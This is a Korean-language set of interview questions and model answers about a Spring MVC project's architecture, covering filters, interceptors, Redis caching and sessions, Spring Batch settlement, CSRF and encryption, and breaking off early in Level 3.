# 프로젝트 면접 질문 (Spring 서버)

> 레벨 1~5 각 20개 / 개념 질문 전체 30% (레벨당 6개) / 프로젝트 질문 70% (레벨당 14개)

---

## LEVEL 1

### [개념-1-1]
**Spring MVC의 DispatcherServlet이 요청을 처리하는 흐름을 설명하세요.**

**답변:**
1. 클라이언트 요청 → `DispatcherServlet` (Front Controller)
2. `HandlerMapping`이 URL에 맞는 Controller(Handler) 조회
3. `HandlerAdapter`가 해당 Controller 실행
4. Controller → ModelAndView 반환
5. `ViewResolver`가 뷰 이름 → 실제 View(JSP 등) 매핑
6. View 렌더링 → 클라이언트 응답

이 프로젝트에서는 `web.xml`에 `DispatcherServlet`을 등록하고 `servlet-context.xml`로 MVC 설정을 분리했으며, `MvcConfig.java`에서 `@EnableWebMvc`로 Java Config 기반 설정을 추가 적용한다.

---

### [개념-1-2]
**`@Transactional`의 기본 동작 원리와 AOP 프록시와의 관계를 설명하세요.**

**답변:**
`@Transactional`은 Spring AOP의 프록시 방식으로 동작한다. 빈을 주입받을 때 실제 객체 대신 프록시 객체가 주입되고, 메서드 호출 시 프록시가 트랜잭션 시작/커밋/롤백을 처리한다. 기본 설정은 `PROPAGATION_REQUIRED`(기존 트랜잭션이 있으면 합류, 없으면 새로 생성), `ISOLATION_DEFAULT`(DB 기본 격리 수준), RuntimeException 발생 시 롤백, Checked Exception은 롤백 안 함. 같은 클래스 내부 메서드 간 호출은 프록시를 거치지 않으므로 트랜잭션이 적용되지 않는다(self-invocation 문제).

---

### [개념-1-3]
**MyBatis에서 `#{}`와 `${}`의 차이를 설명하고, `${}`를 사용하면 안 되는 이유를 설명하세요.**

**답변:**
- `#{}`: PreparedStatement의 파라미터 바인딩. 값을 따옴표로 감싸 SQL Injection을 방지한다.
- `${}`: 문자열 치환(String substitution). 값이 그대로 SQL에 삽입되어 SQL Injection에 취약하다.

`${}`는 동적으로 컬럼명·테이블명·ORDER BY 절 등을 지정할 때만 사용하되, 반드시 화이트리스트 검증 후 사용해야 한다. 사용자 입력값에는 절대 사용하면 안 된다.

---

### [개념-1-4]
**BCrypt를 비밀번호 해싱에 사용하는 이유를 MD5, SHA-256과 비교해서 설명하세요.**

**답변:**
- MD5/SHA-256: 빠른 해시 함수로 GPU를 이용한 브루트포스·레인보우 테이블 공격에 취약하다.
- BCrypt: 의도적으로 느리게 설계된 해시 함수. cost factor(작업 비용)를 조절해 연산 속도를 늦출 수 있고, 매 해싱마다 랜덤 salt를 내부에서 생성해 같은 비밀번호도 다른 해시값이 나온다. 레인보우 테이블 공격을 원천 차단한다. 이 프로젝트의 `SecurityConfig`에서 `BCryptPasswordEncoder`를 빈으로 등록해 회원 가입·로그인 시 사용한다.

---

### [개념-1-5]
**Spring의 `@Component`, `@Service`, `@Repository`, `@Controller`의 차이를 설명하세요.**

**답변:**
모두 `@Component`의 특수화(stereotype)로 컴포넌트 스캔 대상이 된다는 점은 동일하다. 차이점:
- `@Repository`: 데이터 접근 계층. Spring이 DataAccessException으로 예외를 변환한다.
- `@Service`: 비즈니스 로직 계층. 현재는 `@Component`와 동작 차이 없으나 의도를 명확히 표현.
- `@Controller`: Spring MVC 컨트롤러. `@RequestMapping` 처리 대상.
- `@Component`: 위 3개에 해당하지 않는 일반 컴포넌트.

이 프로젝트에서 Mapper 인터페이스는 `@Mapper`(MyBatis)를 사용하며, `@MapperScan`으로 일괄 등록한다.

---

### [개념-1-6]
**HTTP Session과 Cookie의 차이, 그리고 세션 하이재킹을 방어하는 방법을 설명하세요.**

**답변:**
- Cookie: 클라이언트에 저장. 서버 부하 없으나 조작·탈취 위험.
- Session: 서버에 저장, 클라이언트는 세션 ID(쿠키)만 보유. 직접 데이터 노출 없음.
- 세션 하이재킹 방어:
  1. HTTPS 적용 (쿠키 탈취 방지)
  2. `HttpOnly=true` (JS 접근 차단)
  3. `Secure=true` (HTTPS에서만 전송)
  4. 세션 고정 공격 방어: 로그인 성공 시 새 세션 ID 발급

이 프로젝트의 `web.xml`에 `<http-only>true</http-only>`, `<secure>true</secure>` 설정이 되어 있다.

---

### [프로젝트-1-1]
**이 프로젝트의 전체 기술 스택과 각 기술을 선택한 이유를 설명하세요.**

**답변:**
- **Spring MVC 5.3.x**: Spring Boot 없이 WAR 배포. 설정을 직접 제어하기 위해 선택.
- **MyBatis**: 복잡한 SQL을 XML로 직접 관리, JPA보다 쿼리 가시성이 높음.
- **Redis**: 세션 공유(Spring Session), 캐시(@Cacheable), 채팅 Pub/Sub을 하나의 Redis 인스턴스로 처리.
- **Spring Batch 4.3.x**: 매일 새벽 정산 처리. chunk 기반 트랜잭션 분리, skip 기능 활용.
- **Spring Security 5.7.x**: CSRF 보호, 보안 필터 체인 관리.
- **WebSocket/STOMP**: 실시간 채팅 구현.
- **AWS S3 + SDK v2**: 이미지 저장소. CloudFront CDN 연동으로 전송 속도 향상.
- **Toss Payments**: 안전결제 외부 API. WebClient로 비동기 HTTP 호출.
- **HikariCP**: 고성능 커넥션 풀.

---

### [프로젝트-1-2]
**`web.xml`에 필터가 여러 개 등록되어 있습니다. 각 필터의 역할과 실행 순서가 중요한 이유를 설명하세요.**

**답변:**
등록 순서:
1. `springSessionRepositoryFilter`: HttpSession을 Redis Session으로 교체. **가장 먼저** 실행해야 이후 필터와 컨트롤러에서 Redis 세션을 사용할 수 있다.
2. `encodingFilter`: UTF-8 인코딩 강제. 요청 파라미터 읽기 전에 인코딩을 설정해야 한다.
3. `multipartFilter`: CSRF 필터 이전에 Multipart 요청을 파싱. Spring Security의 CSRF 처리가 파일 업로드 요청에도 적용되도록 순서 배치.
4. `springSecurityFilterChain`: 인증/인가, CSRF 검증.

순서가 바뀌면 세션 접근 불가, 인코딩 깨짐, Multipart + CSRF 처리 오류 등이 발생한다.

---

### [프로젝트-1-3]
**`LoginRequiredInterceptor`가 처리하는 인증 방식과, AJAX 요청과 일반 요청을 구분해 다른 응답을 반환하는 이유를 설명하세요.**

**답변:**
세션에서 `loginSess` 키로 `MemberVO`를 조회한다. `null`이면 미인증으로 판단한다.
- **AJAX/JSON 요청** (`X-Requested-With: XMLHttpRequest` 또는 `Accept: application/json`): 401 + JSON 응답 반환. 프론트엔드 JS가 응답을 받아 처리(모달, 알림 등)할 수 있도록.
- **일반 요청**: `/login?redirect=...`으로 리다이렉트. 브라우저가 로그인 페이지로 이동.

AJAX는 브라우저가 자동 리다이렉트를 따라가지 않으므로 JSON으로 명시적 응답이 필요하다.

---

### [프로젝트-1-4]
**`MemberVO`가 `Serializable`을 구현한 이유를 설명하세요.**

**답변:**
Spring Session이 세션 데이터를 Redis에 직렬화(serialize)하여 저장하기 때문이다. `MemberVO`는 세션(`session.setAttribute(Const.SESSION, memberVO)`)에 저장되므로, Redis로 직렬화·역직렬화가 가능하려면 `Serializable`을 구현해야 한다. `serialVersionUID = 1L`을 명시해 클래스 변경 시 역직렬화 오류를 방지한다. 또한 `member_pwd`에 `@JsonIgnore`를 적용해 JSON 직렬화 시 비밀번호가 노출되지 않도록 했다.

---

### [프로젝트-1-5]
**`ServiceLoggingAspect`에서 `within(project..*Service)` 포인트컷을 사용하는 이유와 동작 방식을 설명하세요.**

**답변:**
`within` 포인트컷은 특정 타입 내부의 모든 메서드에 적용된다. `project..*Service`는 `project` 패키지 하위에서 이름이 `Service`로 끝나는 모든 클래스의 public 메서드에 적용한다. `@Around` 어드바이스로 메서드 실행 전후에 `StopWatch`로 수행 시간을 측정하고, 예외 발생 시 에러 로그를 남긴다. `execution(* project..*Service.*(..)))`로도 같은 효과를 낼 수 있으나 `within`이 타입 기반으로 더 직관적이다.

---

### [프로젝트-1-6]
**`GlobalExceptionHandler`에서 `@ControllerAdvice`를 사용한 이유와 AJAX/일반 요청 분기 처리 방식을 설명하세요.**

**답변:**
`@ControllerAdvice`는 모든 Controller에서 발생하는 예외를 한 곳에서 처리한다(전역 예외 처리기). 컨트롤러마다 try-catch를 반복하는 중복을 제거한다.

분기 처리: `X-Requested-With: XMLHttpRequest` 헤더 또는 `Accept: application/json` 헤더가 있으면 AJAX로 판단해 `ResponseEntity<Map>`으로 JSON 응답, 없으면 에러 뷰(JSP)를 반환한다. 예외 유형에 따라 `ForbiddenException`→403, `NotFoundException`→404, `ClientException`→400, `ServerException`→500을 반환한다.

---

### [프로젝트-1-7]
**`HikariCP` 커넥션 풀의 설정값(`maximumPoolSize=5`, `minimumIdle=2`)을 이렇게 작게 설정한 이유는 무엇인가요?**

**답변:**
프로젝트 설명에 "공용 RDS"라는 주석이 있다. 여러 팀/서비스가 하나의 RDS를 공유하는 환경에서는 커넥션을 과도하게 점유하면 다른 서비스에 영향을 준다. 따라서 `maximumPoolSize=5`로 최대 커넥션 수를 제한했다. `minimumIdle=2`는 항상 2개의 커넥션을 유지해 요청 시 즉시 제공한다. `connectionTimeout=30000`(30초)은 커넥션 획득 대기 시간, `maxLifetime=1800000`(30분)은 커넥션 최대 수명으로 DB 측에서 강제 종료하기 전에 갱신한다.

---

### [프로젝트-1-8]
**`SecurityConfig`에서 CSRF를 전역 활성화하면서 일부 경로만 제외한 이유를 설명하세요.**

**답변:**
CSRF는 브라우저가 자동으로 쿠키를 포함해 전송하는 특성을 악용하는 공격이므로, 상태 변경 요청(POST/PUT/DELETE)에 CSRF 토큰 검증이 필요하다. 제외 경로:
- `/chatEndPoint/**`: SockJS WebSocket 연결. SockJS fallback transport에서 CSRF 토큰 전달이 어렵다.
- `/health`: GET 요청, 상태 변경 없음.
- `/admin/api/logout-pending`: `sendBeacon()` API로 전송되어 커스텀 헤더를 추가할 수 없다.
- `/api/mobile/**`: 모바일 앱은 브라우저 쿠키 자동 전송이 없어 CSRF 공격 표면이 없다.

---

### [프로젝트-1-9]
**`@Scheduled`를 사용한 스케줄러가 두 개(`SafePaymentScheduler`, `SettlementScheduler`) 있습니다. 각각의 역할을 설명하세요.**

**답변:**
- `SafePaymentScheduler`:
  - `cleanupExpiredSafePayments()`: 1분마다 실행. 안전결제 요청 후 5분이 지나도 결제가 완료되지 않은 건을 `NONE`으로 초기화해 다음 결제 요청이 가능하도록 한다.
  - `autoConfirmExpiredPurchases()`: 매일 자정 실행. 결제 완료 후 15일이 지나도 구매자가 확정을 누르지 않은 건을 자동 확정 처리해 정산 가능 상태(`READY`)로 변경한다.

- `SettlementScheduler`: 매일 새벽 3시에 Spring Batch `settlementJob`을 실행. `REQUESTED` 상태인 정산 건을 일괄 처리해 관리자 잔액에서 차감 후 `COMPLETED`로 변경한다.

---

### [프로젝트-1-10]
**Bean Validation의 `groups` 기능을 이 프로젝트에서 어떻게 활용하고 있는지 설명하세요.**

**답변:**
`MemberVO`에서 `SignUpGroup`과 `UpdateGroup`을 정의해 유효성 검증 조건을 시나리오별로 분리했다.
- `@NotBlank(groups = {SignUpGroup.class})`: 회원가입 시에만 필수 검증 (login_id, member_pwd 등)
- `@NotBlank(groups = {SignUpGroup.class, UpdateGroup.class})`: 회원가입과 정보 수정 모두 필수 (member_nicknm)

컨트롤러에서 `@Validated(SignUpGroup.class)`처럼 그룹을 지정해 검증한다. 그룹 없이 `@Valid`를 쓰면 Default 그룹만 검증되므로 그룹 지정이 없는 어노테이션만 동작한다.

---

### [프로젝트-1-11]
**`logback.xml`을 별도로 설정한 이유와 `log4jdbc`를 함께 사용하는 이유를 설명하세요.**

**답변:**
기본 Logback 설정은 모든 로그를 콘솔에 출력한다. `logback.xml`을 설정해 패키지별 로그 레벨, 파일 출력, 로그 포맷 등을 제어한다. `log4jdbc`(log4jdbc-log4j2)는 JDBC 드라이버를 래핑해 실제 실행되는 SQL과 파라미터를 로그로 출력한다. MyBatis는 `#{}` 파라미터를 `?`로 바인딩하므로 기본 로그만으로는 실제 실행 SQL을 확인하기 어렵지만, log4jdbc를 사용하면 바인딩된 값까지 확인할 수 있어 디버깅에 유용하다.

---

### [프로젝트-1-12]
**`root-context.xml`과 `servlet-context.xml`을 분리한 이유를 설명하세요.**

**답변:**
Spring의 두 컨텍스트 계층 구조:
- `root-context.xml` → `ContextLoaderListener` → **Root ApplicationContext**: Service, DAO, 인프라 빈(DB, Redis 등). 모든 서블릿이 공유한다.
- `servlet-context.xml` → `DispatcherServlet` → **Servlet ApplicationContext**: Controller, ViewResolver, MVC 설정. DispatcherServlet 전용.

이 프로젝트에서는 `root-context.xml`이 `project.config` 패키지를 스캔해 `MvcConfig`(Java Config)를 로드하고, `servlet-context.xml`은 `<mvc:annotation-driven>`과 정적 리소스 설정을 담당한다. 분리하지 않으면 빈 중복 등록, 트랜잭션 미적용 등의 문제가 발생할 수 있다.

---

### [프로젝트-1-13]
**`MvcConfig`에서 `@MapperScan(basePackages = "project", annotationClass = Mapper.class)`를 사용한 이유를 설명하세요.**

**답변:**
MyBatis의 Mapper 인터페이스는 구현체가 없으므로 Spring이 일반적인 컴포넌트 스캔으로는 빈으로 등록하지 못한다. `@MapperScan`은 지정 패키지에서 `@Mapper` 어노테이션이 붙은 인터페이스를 찾아 MyBatis가 동적으로 생성한 프록시 구현체를 스프링 빈으로 등록한다. `annotationClass = Mapper.class`로 필터링해 `@Mapper`가 없는 인터페이스는 제외한다.

---

### [프로젝트-1-14]
**`MvcConfig`의 `addResourceHandlers`에서 `/upload/**`를 로컬 파일 경로로 매핑한 이유는 무엇이며, S3 환경에서는 이 설정이 필요한가요?**

**답변:**
로컬 개발 환경에서 파일을 서버 디스크에 저장할 때(`FileUploadService`) `/upload/**` 요청을 `file:${file.dir}/`로 매핑해 이미지를 서빙한다. 하지만 운영 환경에서는 `@Primary` 빈인 `S3Service`가 이미지를 S3에 업로드하고 S3/CloudFront URL을 반환한다. S3 URL은 외부 도메인이므로 스프링 리소스 핸들러가 필요 없다. 이 설정은 로컬 환경(`FileUploadService`)을 사용할 때만 의미 있다.

---

---

## LEVEL 2

### [개념-2-1]
**`@Transactional(readOnly = true)`가 성능에 미치는 영향을 구체적으로 설명하세요.**

**답변:**
- **Hibernate/JPA**: 더티 체킹(Dirty Checking)을 비활성화해 스냅샷 저장 비용과 플러시 비용이 사라진다.
- **MyBatis(이 프로젝트)**: 직접적인 더티 체킹 효과는 없지만, JDBC 커넥션을 읽기 전용으로 설정(`Connection.setReadOnly(true)`)한다. DB가 이를 인식하면 Slave 라우팅, 락 획득 생략 등 최적화를 적용할 수 있다.
- **Spring**: 트랜잭션 전파 시 읽기 전용 트랜잭션에 쓰기 작업이 시도되면 예외를 던져 실수로 인한 데이터 변경을 방지한다.

이 프로젝트의 `TradeService`, `SettlementService`, `BookClubService` 등은 클래스 레벨에 `@Transactional(readOnly = true)`를 선언하고, 쓰기 메서드에만 `@Transactional`을 오버라이드한다.

---

### [개념-2-2]
**Spring Security의 CSRF 공격 원리와 토큰 방식 방어 메커니즘을 설명하세요.**

**답변:**
CSRF(Cross-Site Request Forgery): 사용자가 인증된 상태에서 악성 사이트가 사용자의 브라우저를 통해 인증된 요청을 위조해 전송하는 공격. 브라우저가 자동으로 쿠키를 포함시키는 특성을 악용한다.

방어 방식(Synchronizer Token Pattern):
1. 서버가 세션별 고유 CSRF 토큰을 생성해 HTML 폼에 숨겨진 필드로 삽입
2. 클라이언트가 POST 등 상태 변경 요청 시 토큰을 함께 전송
3. 서버가 세션의 토큰과 요청의 토큰을 비교해 검증

악성 사이트는 토큰 값을 알 수 없으므로 위조 요청이 차단된다. 이 프로젝트에서 CSRF 검증 실패 시 `csrfAccessDeniedHandler`가 AJAX/일반 요청을 구분해 401 JSON 또는 로그인 리다이렉트로 처리한다.

---

### [개념-2-3]
**Redis의 `String`, `Hash`, `List`, `Set`, `ZSet` 자료구조 특징과 각 용도를 설명하세요.**

**답변:**
- `String`: 단순 Key-Value. 캐시, 카운터, 세션 저장(이 프로젝트).
- `Hash`: 필드-값 쌍의 맵. 객체를 분산 저장할 때 효율적. Spring Session이 세션 데이터를 Hash로 저장.
- `List`: 연결 리스트. Queue/Stack 구현. 순서 있는 데이터.
- `Set`: 중복 없는 집합. 교집합·합집합 연산. 태그, 좋아요(이 프로젝트의 like는 DB로 처리).
- `ZSet`(Sorted Set): score 기반 정렬 집합. 랭킹, 타임라인.

이 프로젝트에서 `logout:pending:*`, `logout:force:*` 키는 `String`으로 저장한다.

---

### [개념-2-4]
**Spring AOP에서 JDK Dynamic Proxy와 CGLIB Proxy의 차이를 설명하세요.**

**답변:**
- **JDK Dynamic Proxy**: 인터페이스 기반. 빈이 인터페이스를 구현한 경우에만 사용 가능. `java.lang.reflect.Proxy`를 사용.
- **CGLIB**: 클래스 기반. 인터페이스 없이도 클래스를 상속받아 프록시 생성. `final` 클래스/메서드에는 적용 불가.

Spring 기본 설정: `@EnableAspectJAutoProxy`에서 `proxyTargetClass=false`이면 인터페이스가 있으면 JDK, 없으면 CGLIB. `proxyTargetClass=true`이면 항상 CGLIB. `@EnableWebMvc`의 경우 기본적으로 CGLIB을 사용하는 경향이 있다. 이 프로젝트에서 `TradeService` 등은 인터페이스가 없으므로 CGLIB 프록시가 적용된다.

---

### [개념-2-5]
**Spring Batch의 `ItemReader`, `ItemProcessor`, `ItemWriter` 각 컴포넌트의 책임을 설명하세요.**

**답변:**
- `ItemReader`: 데이터를 읽어 한 건씩 반환. `null` 반환 시 읽기 종료. 이 프로젝트에서 `SettlementItemReader`는 DB에서 `REQUESTED` 상태 정산 건을 조회한다.
- `ItemProcessor`: 읽은 데이터를 변환/필터링. `null` 반환 시 해당 아이템 Skip. 이 프로젝트에서 `SettlementItemProcessor`는 암호화된 계좌번호를 복호화한다.
- `ItemWriter`: chunk 단위로 모인 아이템을 일괄 처리. 이 프로젝트에서 `SettlementItemWriter`는 잔액 확인 후 정산 완료 처리한다.

chunk 처리: Reader → (chunk 수만큼 반복) → Processor → Writer → 트랜잭션 커밋.

---

### [개념-2-6]
**`@Cacheable`의 `key` SpEL 표현식과 `unless` 조건의 동작 방식을 설명하세요.**

**답변:**
- `key`: SpEL로 캐시 키를 동적으로 생성. `#trade_seq`는 파라미터명, `#p0`는 첫 번째 파라미터. 복합 키는 `'page:' + #page + ':size:' + #size`처럼 문자열 연결.
- `unless`: 조건이 `true`이면 캐시에 저장하지 않음. `#result == null`이면 null 결과를 캐시하지 않음. `condition`과 달리 `unless`는 메서드 실행 후 결과를 기준으로 평가.
- 동작 흐름: 캐시 조회 → 히트: 반환, 미스: 메서드 실행 → `unless` 조건 평가 → false이면 캐시 저장.

이 프로젝트에서 `TradeService.search()`는 `unless = "#result == null"`로 null 결과 캐싱을 방지한다.

---

### [프로젝트-2-1]
**`TradeService` 클래스 레벨에 `@Transactional(readOnly = true)`를 선언하고 쓰기 메서드에만 `@Transactional`을 오버라이드한 이유를 설명하세요.**

**답변:**
서비스 메서드의 대부분이 조회(`search`, `getList` 등)이므로 기본을 읽기 전용으로 설정해 성능을 최적화한다. 쓰기 메서드(`upload`, `modify`, `remove`, `completePurchaseAndNotify` 등)에만 `@Transactional`을 선언해 쓰기 트랜잭션을 적용한다.

주의할 점: 클래스 레벨 `readOnly = true`가 선언되어 있어도 메서드에 `@Transactional`만 선언하면 해당 메서드는 새 트랜잭션이 시작되며 readOnly가 기본값(`false`)이 된다. 즉 오버라이드가 올바르게 동작한다.

---

### [프로젝트-2-2]
**`SettlementItemProcessor`에서 계좌번호를 복호화하는 이유를 설명하세요. DB에서 복호화하지 않고 Java에서 복호화한 이유는 무엇인가요?**

**답변:**
계좌번호는 민감 개인정보로 DB에 AES-256-CBC 암호화된 상태로 저장한다. 복호화를 DB(SQL 함수)가 아닌 Java에서 처리하는 이유:
1. **키 보안**: 암호화 키(`aes.secret-key`)를 DB에 노출하지 않는다. DB가 침해되어도 키 없이는 복호화 불가.
2. **SQL 로그 보안**: DB에서 복호화하면 쿼리 로그에 평문이 남을 수 있다.
3. **역할 분리**: 암호화/복호화 로직을 애플리케이션 레이어에 집중. `AesEncryptionUtil`이 단일 책임으로 처리.

`SettlementItemProcessor`는 Reader가 읽어온 암호화된 계좌번호를 Writer에 전달하기 전에 복호화해 Writer가 평문 계좌번호를 이체 로그에 기록할 수 있게 한다.

---

### [프로젝트-2-3]
**`InterceptorConfig`에서 4개의 인터셉터가 등록되어 있습니다. 각 인터셉터의 실행 순서와 역할을 설명하세요.**

**답변:**
등록 순서대로 실행(`preHandle`은 등록 순서, `postHandle`·`afterCompletion`은 역순):

1. **`AdminAuthInterceptor`** (preHandle): `/admin/**` 경로에서 관리자 세션 검증. 미인증 시 관리자 로그인 페이지로 리다이렉트.
2. **`LoginRequiredInterceptor`** (preHandle): 명시된 경로에서 회원 세션 검증. 미인증 시 401 JSON 또는 로그인 리다이렉트.
3. **`UnreadInterceptor`** (postHandle): `/**`에서 응답 모델에 `messageSign=true`를 추가해 읽지 않은 채팅 메시지 표시. `modelAndView != null`일 때만 동작(REST API 제외).
4. **`MemberActivityInterceptor`** (preHandle): `/**`에서 강제 로그아웃 대상 체크 및 pending 상태 제거.

---

### [프로젝트-2-4]
**`AesEncryptionUtil`에서 암호화할 때마다 새로운 IV(Initialization Vector)를 생성하는 이유를 설명하세요.**

**답변:**
AES-CBC 모드에서 같은 키와 같은 IV로 같은 평문을 암호화하면 항상 같은 암호문이 나온다. 이 경우 공격자가 암호문만으로 패턴을 분석하거나(Known-Plaintext Attack) 동일 값을 가진 레코드를 식별할 수 있다. `SecureRandom`으로 매 암호화마다 16바이트 IV를 새로 생성하면 같은 계좌번호도 매번 다른 암호문이 생성된다(IND-CPA 안전성). IV는 비밀이 아니므로 `Base64(IV):Base64(암호문)` 형식으로 암호문과 함께 저장하며, 복호화 시 분리해서 사용한다.

---

### [프로젝트-2-5]
**`S3Service`에서 이미지 업로드 시 확장자 → MIME 타입 → Magic Bytes 순으로 3단계 검증을 하는 이유를 설명하세요.**

**답변:**
단일 검증만으로는 우회 가능하기 때문이다.
- **확장자만 검증**: `evil.jsp`를 `evil.jpg`로 이름만 바꾸면 우회 가능.
- **MIME 타입만 검증**: `Content-Type` 헤더는 클라이언트가 임의 설정 가능. `application/octet-stream`이나 `image/jpeg`로 조작 가능.
- **Magic Bytes 검증**: 파일의 실제 바이너리 시그니처(JPEG: `FF D8 FF`, PNG: `89 50 4E 47` 등)를 확인. 악성 파일은 이미지 시그니처를 가질 수 없다.

3단계 모두 통과해야 실제 이미지 파일임을 보장한다. 웹쉘 업로드 공격을 방어하는 핵심 로직이다.

---

### [프로젝트-2-6]
**`RedisConfig`에서 `StringRedisTemplate`과 `RedisTemplate<String, Object>`를 별도로 선언한 이유를 설명하세요.**

**답변:**
- `StringRedisTemplate`: key와 value 모두 `String`으로 직렬화. 채팅 Pub/Sub(`ChatMessagePublisher`), 로그아웃 pending 관리(`RedisLogoutPendingManager`) 등 JSON 문자열을 직접 다룰 때 사용. 오버헤드가 적다.
- `RedisTemplate<String, Object>`: key는 `StringRedisSerializer`, value는 `GenericJackson2JsonRedisSerializer`(JSON). 복잡한 객체를 직렬화할 때 사용.

`StringRedisTemplate`은 `RedisTemplate<String, String>`의 특수화로, 타입 안전성과 성능이 좋다. Pub/Sub 메시지는 이미 직접 JSON 직렬화(`objectMapper.writeValueAsString`)를 하므로 `StringRedisTemplate`으로 충분하다.

---

### [프로젝트-2-7]
**`BookClubService.uploadFile()`에서 파일 검증을 `S3Service.validateFile()`과 별도로 서비스 레이어에서도 수행하는 이유를 설명하세요.**

**답변:**
방어적 프로그래밍(Defense in Depth)의 일환이다. `S3Service`는 인프라 계층으로 모든 이미지 업로드 경로에서 재사용된다. 서비스 레이어에서도 검증하면 두 가지 이점이 있다:
1. **조기 실패(Fail Fast)**: S3 API 호출 전에 잘못된 입력을 차단해 불필요한 네트워크 비용을 줄인다.
2. **비즈니스 규칙 적용**: 서비스마다 다른 검증 규칙(예: 독서모임은 5MB 제한, 다른 서비스는 10MB 허용)을 적용할 수 있다. S3Service의 검증은 범용적인 최소 기준이다.

---

### [프로젝트-2-8]
**`RedisCacheConfig`에서 캐시별로 다른 TTL(trade=10분, tradeList=5분)을 설정한 이유를 설명하세요.**

**답변:**
데이터 변경 빈도에 따라 TTL을 다르게 설정했다.
- `trade`(단건, 10분): 특정 상품의 상세 정보는 자주 변경되지 않는다. 수정/삭제 시 `@CacheEvict`로 즉시 무효화되므로 TTL이 길어도 정합성이 보장된다.
- `tradeList`(목록, 5분): 새 글 등록, 찜 수 변경 등으로 자주 변경된다. 짧은 TTL로 최신 데이터를 더 빠르게 반영한다. 목록은 `allEntries = true`로 전체 무효화하므로 새 글 등록 시 즉시 갱신된다.

TTL은 캐시 스탬피드(Cache Stampede) 방지를 위해 완전히 0으로 하지 않는다.

---

### [프로젝트-2-9]
**`web.xml`에 `<multipart-config>`가 DispatcherServlet에 설정되어 있고, `MvcConfig`에 `filterMultipartResolver` 빈도 등록되어 있습니다. 둘 다 필요한 이유를 설명하세요.**

**답변:**
- `<multipart-config>` in DispatcherServlet: Servlet 3.0 표준 멀티파트 처리. DispatcherServlet에서 `@RequestParam MultipartFile` 등을 통해 파일 파라미터를 받을 수 있게 한다.
- `filterMultipartResolver`(= `MultipartFilter` + `StandardServletMultipartResolver`): `web.xml`에서 `multipartFilter`가 `springSecurityFilterChain` **이전**에 실행된다. Spring Security가 CSRF 검증을 위해 요청 바디를 파싱할 때, 멀티파트 요청이 이미 파싱되어 있어야 CSRF 토큰을 추출할 수 있다. 즉 멀티파트 파일 업로드 시 CSRF 검증이 정상 동작하도록 하는 것이 `MultipartFilter`의 역할이다.

---

### [프로젝트-2-10]
**`StompConfig`에서 `HttpSessionHandshakeInterceptor`를 등록한 이유를 설명하세요.**

**답변:**
WebSocket 연결(Handshake) 시 HTTP 세션을 WebSocket 세션으로 복사하기 위해서다. STOMP 핸들러(`StompController`)에서 `SimpMessageHeaderAccessor.getSessionAttributes()`로 로그인 세션 정보(`MemberVO`)를 접근할 수 있게 한다. 이 인터셉터 없이는 WebSocket 세션에 HTTP 세션 속성이 없어 `sessionMember`가 null이 되어 인증 검증이 불가능하다.

`validateSessionAndMembership()` 메서드에서 WebSocket 메시지 처리 시 세션의 `MemberVO`를 조회해 비로그인 사용자나 채팅방 비참여자의 메시지를 차단한다.

---

### [프로젝트-2-11]
**`MemberVO`의 `crt_dtm` 필드에 `@JsonIgnore`와 `@JsonProperty`를 함께 사용하는 이유를 설명하세요.**

**답변:**
```java
@JsonIgnore  // 필드 직렬화 제외
private LocalDateTime crt_dtm;

@JsonProperty("crt_dtm")  // 같은 이름의 JSON 필드로 반환
public String getCrtDtmFormatted() { ... }
```
`LocalDateTime`은 기본 Jackson 직렬화 시 `[2024,1,1,12,0,0]` 같은 배열 형태로 직렬화된다. `@JsonIgnore`로 필드 직렬화를 막고, `@JsonProperty("crt_dtm")`이 붙은 getter 메서드에서 포맷팅된 문자열(`yyyy-MM-dd HH:mm`)을 반환한다. 같은 JSON 키 이름을 유지하면서 클라이언트 친화적 날짜 형식을 제공한다. `JavaTimeModule`을 등록해도 되지만, 이 방식은 특정 필드에만 포맷을 적용할 때 유용하다.

---

### [프로젝트-2-12]
**`PaymentController`에서 결제 성공 후 `redirect:/payments/result?status=success`로 PRG 패턴을 적용한 이유를 설명하세요.**

**답변:**
PRG(Post-Redirect-Get) 패턴:
- 결제 성공 처리는 POST 요청(`/payments/success` GET이지만 결제 후 리다이렉트)
- 직접 뷰를 반환하면 브라우저 새로고침 시 동일 요청이 재전송될 수 있다
- `paymentKey`, `orderId` 등 민감 결제 정보가 URL에 노출된다

PRG 적용 후:
1. 결제 완료 처리 → `RedirectAttributes.addFlashAttribute("payment", ...)` (세션에 임시 저장)
2. `redirect:/payments/result?status=success` → 브라우저가 GET 요청
3. `/payments/result`에서 FlashAttribute로 데이터 수신

새로고침해도 GET 요청만 반복되므로 중복 결제 처리가 없고, URL에 민감정보가 노출되지 않는다.

---

### [프로젝트-2-13]
**`SettlementScheduler`에서 `JobParameters`에 `run.id = System.currentTimeMillis()`를 매번 추가하는 이유를 설명하세요.**

**답변:**
Spring Batch는 동일한 `Job`과 `JobParameters` 조합을 `JobInstance`로 관리한다. 같은 파라미터로 이미 `COMPLETED` 상태의 `JobInstance`가 있으면 재실행을 거부한다(`JobInstanceAlreadyCompleteException`). 매일 같은 배치를 실행하려면 매번 다른 `JobParameters`가 필요하다. `System.currentTimeMillis()`를 `run.id`로 추가하면 매 실행마다 고유한 `JobInstance`가 생성되어 배치가 정상 재실행된다.

---

### [프로젝트-2-14]
**`AdminController`에 `@Validated`가 선언되어 있고 메서드 파라미터에 `@NotBlank`, `@Size`를 직접 사용합니다. 어떻게 동작하나요?**

**답변:**
`@Validated`를 클래스 레벨에 선언하면 Spring AOP가 메서드 파라미터에 붙은 Bean Validation 어노테이션을 자동으로 검증한다(Method-level validation). `@Valid`와 달리 `@Validated`는 그룹 지정도 가능하다. 검증 실패 시 `ConstraintViolationException`이 발생하며, 이는 `@ExceptionHandler`로 처리할 수 있다.

`@RequestParam @NotBlank String loginId`처럼 단순 파라미터에도 적용 가능해, 별도 VO 없이 컨트롤러 메서드 파라미터 수준에서 검증할 수 있다.

---

---

## LEVEL 3

### [개념-3-1]
**Redis Pub/Sub와 Kafka/RabbitMQ 같은 Message Queue의 차이를 설명하세요.**

**답변:**
| 항목 | Redis Pub/Sub | Message Queue (Kafka 등) |
|---|---|---|
| 메시지 보존 | 없음. 구독자 없을 때 메시지 유실 | 디스크 저장, 재처리 가능 |
| 전송 보장 | At-most-once | At-least-once / Exactly-once 지원 |
| 구독자 | 연결된 모든 구독자에게 동시 전달 | Consumer Group으로 분산 소비 |
| 확장성 | 단순, 가볍다 | 고처리량, 분산 처리 |
| 재처리 | 불가 | 오프셋 기반 재처리 가능 |

